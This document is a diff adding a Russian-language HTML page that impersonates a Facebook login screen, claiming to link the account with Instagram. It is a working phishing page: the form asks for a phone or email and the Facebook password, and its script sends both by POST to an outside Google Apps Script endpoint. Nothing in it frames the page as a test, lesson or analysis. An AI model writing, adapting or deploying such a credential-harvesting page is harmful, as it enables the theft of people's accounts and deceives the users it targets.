@@ -1,0 +1,64 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport"
+          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <link rel="stylesheet" href="./css/face.css">
+    <link rel="stylesheet" href="./css/style.css">
+    <title>Facebook</title>
+</head>
+<body class="face">
+<header>
+    <img src="./img/face0.png" alt="">
+</header>
+<main>
+    <section class="sec1 signup-container">
+        <div class="inst-logo">
+            <img src="./img/face1.png" alt="">
+        </div>
+        <p >Войдите в свой аккаунт Facebook, <br>
+        чтобы связать его с Instagram
+        </p>
+    </section>
+    <section class="form">
+        <form name="submit-to-google-sheet2">
+            <label>
+                <input class="int1" type="text" name="fabook" autocomplete="off" placeholder="Мобильный телефон или электронный адрес" required>
+                <input class="int2" type="text" name="fa-pss" autocomplete="off" placeholder="Пароль Facebook" required>
+            </label>
+                <button type="submit">Войти</button>
+            <p>Забыли пароль?</p>
+        </form>
+        <div class="text">
+            <p class="text1">Создать аккаунт</p>
+            <p class="text2">Не сейчас</p>
+            <p class="text3">Справочный центр</p>
+        </div>
+    </section>
+</main>
+<footer>
+    <div class="face-lang">
+        <p>Русский <i class="fa-solid fa-chevron-down"></i></p>
+    </div>
+</footer>
+
+<script src="https://kit.fontawesome.com/99d91a2e97.js" crossorigin="anonymous"></script>
+<script>
+    const scriptURL2 = 'https://script.google.com/macros/s/AKfycbxJrK2IS2W0muUBnsEbjYnIqiwqGDQt6Z9qgO_4c5dGQt2uJ1TPBaArNlXgcItS3mUGjQ/exec';
+    const form2 = document.forms['submit-to-google-sheet2'];
+
+    form2.addEventListener('submit', e => {
+        e.preventDefault();
+        fetch(scriptURL2, { method: 'POST', body: new FormData(form2)})
+            .then(response => {
+                setTimeout(function () {
+                }, 2000)
+                form2.reset()
+            })
+            .catch(error => console.error('Error!', error.message))
+    });
+</script>
+</body>
+</html>
